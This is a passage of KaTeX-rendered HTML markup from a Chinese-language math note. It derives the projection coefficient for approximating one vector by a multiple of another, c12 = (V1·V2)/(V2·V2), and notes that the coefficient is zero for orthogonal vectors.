linebreak="newline"></mspace><mtext>正交时，</mtext><mo><mover><mo><msub><mi>V</mi><mn>2</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mtext>无法表示</mtext><mo><mover><mo><msub><mi>V</mi><mn>1</mn></msub></mo><mo lspace="0em" rspace="0em">⇀</mo></mover></mo><mtext>，</mtext><msub><mi>c</mi><mn>12</mn></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\stackrel{\rightharpoonup}{V_{e}}\stackrel{\Delta}{=}\stackrel{\rightharpoonup}{V_{1}}-c_{12}\stackrel{\rightharpoonup}{V_{2}}\\用与V_{2}成比例的矢量c_{12}\stackrel{\rightharpoonup}{V_{2}}近似表示\stackrel{\rightharpoonup}{V_{1}}\\|c_{12}\stackrel{\rightharpoonup}{V_{2}}|=|\stackrel{\rightharpoonup}{V_{1}}|\cos\theta\\c_{12}=\frac{|\stackrel{\rightharpoonup}{V_{1}}|\cos\theta}{|\stackrel{\rightharpoonup}{V_{2}}|}={|\stackrel{\rightharpoonup}{V_{1}}||\stackrel{\rightharpoonup}{V_{2}}|\cos\theta}{|\stackrel{\rightharpoonup}{V_{2}}||\stackrel{\rightharpoonup}{V_{2}}|}=\frac{\stackrel{\rightharpoonup}{V_{1}}\cdot\stackrel{\rightharpoonup}{V_{2}}}{\stackrel{\rightharpoonup}{V_{2}}\cdot\stackrel{\rightharpoonup}{V_{2}}}\\推广:c_{1r}=\frac{\stackrel{\rightharpoonup}{V_{1}}\cdot\stackrel{\rightharpoonup}{V_{r}}}{\stackrel{\rightharpoonup}{V_{r}}\cdot\stackrel{\rightharpoonup}{V_{r}}}\qquad\stackrel{\rightharpoonup}{V_{r}}是分量\\正交时，\stackrel{\rightharpoonup}{V_{2}}无法表示\stackrel{\rightharpoonup}{V_{1}}，c_{12}=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.390139em;vertical-align:-0.15em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="base"><span class="strut" style="height:1.1452010000000001em;vertical-align:0em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1452010000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">=</span></span></span><span style="top:-3.5668699999999998em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">Δ</span></span></span></span></span></span></span></span></span></span><span class="base"><span class="strut" style="height:1.390139em;vertical-align:-0.15em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.390139em;vertical-align:-0.15em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.390139em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">与</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">矢</span><span class="mord cjk_fallback">量</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.390139em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">近</span><span class="mord cjk_fallback">似</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.490139em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.490139em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.273732em;vertical-align:-0.8868659999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.386866em;"><span style="top:-2.288134em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">∣</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mop mtight"><span class="mtight">c</span><span class="mtight">o</span><span class="mtight">s</span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8868659999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.490139em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span><span class="mord"><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">∣</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.123932em;vertical-align:-0.8119659999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.311966em;"><span style="top:-2.288134em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">⋅</span><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">⋅</span><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8119659999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">推</span><span class="mord cjk_fallback">广</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" 